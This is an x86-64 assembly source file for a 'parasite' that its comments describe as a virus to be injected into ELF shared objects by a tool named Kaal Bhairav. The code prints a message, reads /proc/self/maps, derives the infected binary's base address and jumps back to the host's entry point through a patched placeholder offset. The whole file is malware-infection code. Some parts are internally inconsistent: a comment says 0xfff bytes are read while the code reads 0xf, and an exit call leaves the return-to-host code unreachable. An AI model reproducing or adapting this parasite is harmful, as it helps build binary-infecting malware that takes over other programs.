BITS 64

; Author : Abhinav Thakur
; Email  : compilepeace@gmail.com

; Description : This parasite is foccused to be injected in a shared object. Jump-on-exit needs to be
;               an absolute address rather than an offset (so contains only the offsets and no 
;               virtual addresses). So, parasite calculates the base address (where the infected 
;               binary is loaded at runtime) and adds the base address to the offset 
;               (0xAAAAAAAAAAAAAAAA) to get an absolute address @ which the jump will happen.
;                       
;               Shellcode prints a message, generates an absolute address to transfer control to a 
;               virtual address (entry point of running shared object code)
;
; base_address_of_infected_binary = parasite_load_address - parasite_offset(to be replaced by user)
; Jmp_on_Exit_address             = base_address_of_infected_binary + 0xAAAAAAAAAAAAAAAA
;
; parsite_load_address  => The address @ which parasite is loaded (along with infected binary)


global _start


;-x-x-x-x- CONSTANTS -x-x-x-x-;
STDIN       equ 0
STDOUT      equ 1
STDERR      equ 2

SYS_WRITE   equ 0x1         ; 1
SYS_EXIT    equ 0x3c        ; 60
SYS_READ    equ 0x0         ; 0
SYS_OPEN    equ 0x2         ; 2
SYS_LSEEK   equ 0x8         ; 8
SYS_EXECVE  equ 0x3b        ; 59

O_RDONLY    equ 0x0         ; 0
;-x-x-x-x- CONSTANTS -x-x-x-x-;



section .text
_start:

	xor  rbx, rbx
	mov  rbx, _start						; Current instruction's address

	; Save register state, RBX can be safely used
	push rax
	push rcx
	push rdx
	push rsi
	push rdi
	push r11

	
	jmp	parasite
	message:	db	"-x-x-x-x- COMPILEPEACE : Cute little virus ^_^ -x-x-x-x-", 0xa
	filepath:   db  "/proc/self/maps", 0x0          ; 16 bytes


parasite:

	; Print our message
	xor	rax, rax					; Zero out RAX
	add	rax, 0x1					; Syscall number of write() - 0x1
	mov rdi, rax					; File descriptor - 0x1 (STDOUT)
	lea rsi, [rel message]			; Addresses the label relative to RIP (Instruction Pointer), i.e. 
									; dynamically identifying the address of the 'message' label.
	xor rdx, rdx
	mov dl, 0x39					; message size = 57 bytes (0x39)
	syscall					


; RBX stores the address where the binary is loaded
;--------------------------------------------------------------------

    ; open file in memory
    ; int open(const char *pathname, int flags)     
    xor rax, rax
    xor rdi, rdi
    lea rdi, [rel filepath]     ; pathname
    ;mov sil, O_RDONLY          ; flags = O_RDONLY
    xor rsi, rsi                ; 0 for O_RDONLY macro
    mov al, SYS_OPEN            ; syscall number for open()
    syscall


    ; read file, AL stores the fd returned by open() syscall
    ; Seems like currently program load address is 6 bytes long (0x55a6e51c2000-...)
	; ssize_t read(int fd, void *buf, size_t count);
    xor rdi, rdi
    mov dil, al                 ; fd
    sub sp, 0xf                 ; allocate space for /proc/<pid>/maps
    mov rsi, rsp                ; get file content on stack
    xor rdx, rdx
    mov dx, 0xf                 ; Read 0xfff bytes from file
    xor rax, rax
    mov al, SYS_READ            ; syscall number for read()
    syscall


found:
    ; write file contents to STDOUT
    ; ssize_t write(int fd, const void *buf, size_t count)
    xor rdx, rdx
    mov rdx, rax                ; read() returned no. of bytes read
    mov rsi, rsp                ; from the top of stack
    xor rdi, rdi
    mov dil, STDOUT             ; write to STDOUT
    xor rax, rax
    mov rax, 0x1                ; syscall number for write()
    syscall


    ; void _exit(int status)
    xor rax, rax
    mov rdi, rax                ; RDI   = 0x0 (Exit Status)
    add al, SYS_EXIT            ; Syscall Number    
    syscall



;-------------------------------------------------------------------



	; Find the Absolute address where the currently running binary is located. 
	; This is done by reading first 6 bytes of file /proc/<pid>/maps  
	

	; Restoring register state
	pop r11
	pop rdi
	pop rsi
	pop rdx
	pop rcx
	pop rax

	
	; RBX contains the base address (where the program is loaded in memory), adding the offset of
	; entry point to it will give us the exact location the parasite has to resume afterexecution. 
	; The placeholder (0xA's) has to be replaced by Kaal Bhairav by entry point offset.
	add	rbx, 0xAAAAAAAAAAAAAAAA		
	jmp	rbx

